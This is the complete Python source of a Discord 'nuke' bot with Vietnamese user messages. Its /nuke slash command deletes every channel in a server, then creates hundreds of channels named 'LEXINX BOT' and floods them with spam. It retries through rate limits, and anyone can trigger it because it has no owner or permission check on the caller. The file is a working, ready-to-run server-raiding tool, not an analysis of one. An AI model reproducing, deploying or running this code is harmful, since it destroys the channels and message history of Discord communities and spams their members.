# language: Python 3.10+, file: bot.py
# pip install discord.py python-dotenv
# Chạy: python bot.py
# WARNING: NO owner check — ANYONE with Manage Channels can run /nuke

import os
import asyncio
import time
from datetime import datetime

import discord
from discord import app_commands
from discord.ext import commands
from dotenv import load_dotenv

load_dotenv()

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
GUILD_ID  = int(os.environ.get("GUILD_ID", "0"))

CHANNEL_NAME   = "LEXINX BOT"
SPAM_MESSAGE   = "lexinx"
DELETE_DELAY   = 0.4
CREATE_DELAY   = 0.4
SPAM_DELAY     = 0.8

# ============ BOT SETUP ============
intents = discord.Intents.default()
intents.guilds = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree


@bot.event
async def on_ready():
    try:
        await tree.sync()
        if GUILD_ID:
            guild = discord.Object(id=GUILD_ID)
            tree.copy_global_to(guild=guild)
            await tree.sync(guild=guild)
        print(f"[+] bot online: {bot.user} (id={bot.user.id})")
        print(f"[+] guilds: {[g.name for g in bot.guilds]}")
    except Exception as e:
        print(f"[x] on_ready: {e}")


# ============ NUKE COMMAND (no owner gate) ============
@tree.command(name="nuke", description="⚠ DELETE ALL CHANNELS + SPAM NEW ONES")
@app_commands.describe(
    numbercofchannels="How many channels to create",
    numberofchats="How many messages to send per new channel"
)
async def nuke(
    interaction: discord.Interaction,
    numbercofchannels: int,
    numberofchats: int
):
    if numbercofchannels < 1 or numbercofchannels > 500:
        await interaction.response.send_message(
            "❌ numbercofchannels phải trong khoảng 1–500.", ephemeral=True)
        return
    if numberofchats < 1 or numberofchats > 100:
        await interaction.response.send_message(
            "❌ numberofchats phải trong khoảng 1–100.", ephemeral=True)
        return

    guild = interaction.guild
    if guild is None:
        await interaction.response.send_message("❌ Chỉ dùng trong server.", ephemeral=True)
        return

    me = guild.me
    if not me.guild_permissions.manage_channels or not me.guild_permissions.manage_messages:
        await interaction.response.send_message(
            "❌ Bot thiếu quyền: cần **Manage Channels** + **Manage Messages**.",
            ephemeral=True)
        return

    await interaction.response.send_message(
        f"💣 **NUKE STARTED** by {interaction.user.mention}\n"
        f"• Channels to create: `{numbercofchannels}`\n"
        f"• Messages per channel: `{numberofchats}`\n"
        f"• Channel name: `{CHANNEL_NAME}`\n"
        f"• Message: `{SPAM_MESSAGE}`",
        ephemeral=False
    )

    bot.loop.create_task(run_nuke(guild, numbercofchannels, numberofchats))


async def run_nuke(guild: discord.Guild, num_channels: int, num_chats: int):
    start = time.time()

    # ---- STEP 1: DELETE ALL CHANNELS ----
    print(f"[*] deleting {len(guild.channels)} channels…")
    deleted = 0
    failed = 0

    channels = list(guild.channels)
    channels.sort(key=lambda c: isinstance(c, discord.CategoryChannel))

    for ch in channels:
        try:
            await ch.delete(reason="nuke command")
            deleted += 1
            if deleted % 5 == 0:
                print(f"    deleted {deleted}/{len(channels)}")
            await asyncio.sleep(DELETE_DELAY)
        except discord.Forbidden:
            failed += 1
            print(f"    [x] forbidden: {ch.name}")
        except discord.HTTPException as e:
            failed += 1
            if e.status == 429:
                retry = getattr(e, "retry_after", 2)
                print(f"    [!] rate limit, waiting {retry}s")
                await asyncio.sleep(retry + 0.5)
            else:
                print(f"    [x] http {e.status}: {ch.name}")
        except Exception as e:
            failed += 1
            print(f"    [x] {ch.name}: {e}")

    print(f"[*] deleted={deleted} failed={failed}")

    # ---- STEP 2: CREATE CHANNELS + SPAM ----
    print(f"[*] creating {num_channels} channels named '{CHANNEL_NAME}'…")
    created = 0

    for i in range(1, num_channels + 1):
        try:
            new_ch = await guild.create_text_channel(
                name=CHANNEL_NAME,
                reason="nuke command"
            )
            created += 1
            print(f"    [+] created #{created}: {new_ch.name}")

            # ---- STEP 3: SPAM MESSAGES ----
            for j in range(num_chats):
                try:
                    await new_ch.send(SPAM_MESSAGE)
                    await asyncio.sleep(SPAM_DELAY)
                except discord.Forbidden:
                    print(f"    [x] cannot send in {new_ch.name}")
                    break
                except discord.HTTPException as e:
                    if e.status == 429:
                        retry = getattr(e, "retry_after", 2)
                        await asyncio.sleep(retry + 0.5)
                    else:
                        break
                except Exception:
                    break

            await asyncio.sleep(CREATE_DELAY)

        except discord.Forbidden:
            print(f"    [x] forbidden to create channel #{i}")
            break
        except discord.HTTPException as e:
            if e.status == 429:
                retry = getattr(e, "retry_after", 3)
                print(f"    [!] rate limit, waiting {retry}s")
                await asyncio.sleep(retry + 1)
                continue
            print(f"    [x] http {e.status}")
        except Exception as e:
            print(f"    [x] {e}")

    elapsed = time.time() - start
    print(f"[✓] NUKE COMPLETE in {elapsed:.1f}s — deleted={deleted} created={created}")


# ============ SAFE COMMAND ============
@tree.command(name="ping", description="Check bot alive")
async def ping(interaction: discord.Interaction):
    await interaction.response.send_message(
        f"🏓 pong — {round(bot.latency*1000)}ms", ephemeral=True)


# ============ RUN ============
if __name__ == "__main__":
    if not BOT_TOKEN:
        print("[x] BOT_TOKEN chưa set trong .env")
        exit(1)
    bot.run(BOT_TOKEN)
